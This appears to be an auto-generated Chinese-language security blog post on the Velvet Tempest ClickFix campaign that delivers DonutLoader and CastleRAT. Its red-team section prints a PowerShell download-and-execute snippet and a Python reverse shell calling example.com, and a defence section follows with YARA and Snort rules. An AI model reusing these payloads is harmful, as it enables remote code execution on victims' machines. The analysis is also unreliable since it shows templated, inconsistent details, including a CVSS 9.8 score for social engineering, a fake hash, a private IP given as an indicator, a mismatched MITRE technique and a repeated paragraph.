---
layout: post
title:  "Termite ransomware breaches linked to ClickFix CastleRAT attacks"
date:   2026-03-07 18:25:09 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Velvet Tempest 威脅群體的 ClickFix 技術與 DonutLoader 惡意軟體

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: ClickFix, DonutLoader, CastleRAT, PowerShell

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Velvet Tempest 威脅群體使用 ClickFix 技術，透過 malvertising 活動，誘導受害者執行惡意指令，進而取得系統存取權。
* **攻擊流程圖解**:
  1. User Input -> malvertising 活動 -> ClickFix 技術
  2. ClickFix 技術 -> PowerShell 腳本 -> DonutLoader 惡意軟體
  3. DonutLoader 惡意軟體 -> CastleRAT 後門
* **受影響元件**: Windows 系統，特別是具有弱點的 PowerShell 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者必須點擊 malvertising 活動的連結，且系統必須具有弱點的 PowerShell 版本。
* **Payload 建構邏輯**:

    ```
    
    powershell
      # PowerShell 腳本範例
      $url = "https://example.com/malware"
      $output = "C:\Windows\Temp\malware.exe"
      Invoke-WebRequest -Uri $url -OutFile $output
      Start-Process -FilePath $output
    
    ```
 

```

python
  # Python 腳本範例 (CastleRAT 後門)
  import socket
  import subprocess

  # 建立連線
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("example.com", 8080))

  # 執行命令
  while True:
    command = sock.recv(1024).decode()
    if command == "exit":
      break
    subprocess.Popen(command, shell=True)

```
* **繞過技術**: Velvet Tempest 威脅群體使用 ClickFix 技術，透過 malvertising 活動，誘導受害者執行惡意指令，進而取得系統存取權。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.168.1.100 |
| Domain | example.com |
| File Path | C:\Windows\Temp\malware.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Velvet_Tempest {
        meta:
          description = "Velvet Tempest 威脅群體的惡意軟體"
          author = "Your Name"
        strings:
          $a = "https://example.com/malware"
          $b = "C:\Windows\Temp\malware.exe"
        condition:
          all of them
      }
    
    ```
 

```

snort
  alert tcp any any -> any any (msg:"Velvet Tempest 威脅群體的惡意軟體"; content:"https://example.com/malware"; sid:1000001; rev:1;)

```
* **緩解措施**: 更新 PowerShell 版本，關閉不必要的功能，限制使用者權限，使用防毒軟體和入侵偵測系統。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ClickFix**: 一種社交工程技術，透過 malvertising 活動，誘導受害者執行惡意指令。
* **DonutLoader**: 一種惡意軟體，負責下載和執行其他惡意軟體。
* **CastleRAT**: 一種後門軟體，允許攻擊者遠程控制受害者的系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/termite-ransomware-breaches-linked-to-clickfix-castlerat-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


